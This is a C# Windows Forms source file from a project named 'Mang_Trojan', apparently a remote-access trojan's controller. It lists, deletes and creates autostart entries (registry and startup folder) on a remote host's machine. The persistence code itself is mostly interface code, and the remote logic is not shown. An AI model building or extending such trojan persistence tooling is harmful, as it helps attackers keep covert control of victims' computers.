using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Mang_Trojan.form
{
    public partial class StartupManager : Form
    {
        RemoteObject.ScreenObject hostInstance;
        ListViewHitTestInfo selected = null;

        public StartupManager(RemoteObject.ScreenObject hostInstance)
        {
            InitializeComponent();
            this.hostInstance = hostInstance;
            this.Text = hostInstance.GetComputerName();
            Renew();
            
        }

        private void Renew()
        {

            listView1.Items.Clear();
            string Start = hostInstance.GetStartUpPrograms();
            string[] fields = Start.Split(new string[] { Environment.NewLine }, StringSplitOptions.None);

            foreach (string field in fields)
            {
                if (field != string.Empty)
                {   
                    string[] StartItem = field.Split(new string[] { "|*|" }, StringSplitOptions.None);
                    ListViewItem listItem = new ListViewItem(StartItem[0]);
                    for (int i = 1; i < StartItem.Length; i++)
                    {
                        listItem.SubItems.Add(StartItem[i]);
                    }
                    listView1.Items.Add(listItem);
                }
            }
        }

        private void listView1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                contextMenuStrip1.Show(listView1, e.Location);
                selected = listView1.HitTest(e.X, e.Y);
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Renew();
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            hostInstance.Remove(selected.Item.Text, "CU");
            hostInstance.Remove(selected.Item.Text, "LM");
            hostInstance.Remove(selected.Item.Text, "SF");
            Renew();
        }

        private void createToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string path = SelectTextFile();

            if (path != null)
            {
                //co 2 tham so,1 la program,2 la path
                //path kia roi,program thi cat path ra
                int i = path.LastIndexOf("\\");
                string program = path.Substring(i + 1);
                hostInstance.Create(program, "CU", path);
                hostInstance.Create(program, "LM", path);
                hostInstance.Create(program, "SF", path);
                Renew();
            }
            else
            {
                MessageBox.Show("Bạn phải chọn tập tin thực thi");
            }
        }
        public string SelectTextFile()
        {
            /*
            OpenFileDialog dialog = new OpenFileDialog();
            dialog.Filter =
               "exe files (*.exe)|*.exe|All files (*.*)|*.*";
            dialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            dialog.Title = "Select a text file";
            return (dialog.ShowDialog() == DialogResult.OK)
               ? dialog.FileName : null;
             */
            StartUpFile startUpFileForm = new StartUpFile(hostInstance);
            startUpFileForm.ShowDialog();
            if (startUpFileForm.DialogResult == DialogResult.OK)
            {
                return startUpFileForm.SetFilePath;
            }
            return string.Empty;
        }
    }
}
